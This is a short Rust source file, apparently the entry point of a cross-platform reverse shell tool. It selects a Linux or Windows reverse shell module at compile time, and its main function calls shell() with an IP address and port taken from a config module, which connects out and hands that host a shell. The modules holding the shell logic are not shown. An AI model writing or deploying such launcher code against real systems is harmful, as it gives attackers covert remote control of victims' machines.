// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(target_os = "linux")]
mod rco_reverse_shell_linux;
#[cfg(target_os = "linux")]
use rco_reverse_shell_linux::shell;

#[cfg(windows)]
mod rco_reverse_shell_windows;
#[cfg(windows)]
use rco_reverse_shell_windows::shell;

fn main() {
    shell(config::IP, config::PORT);
}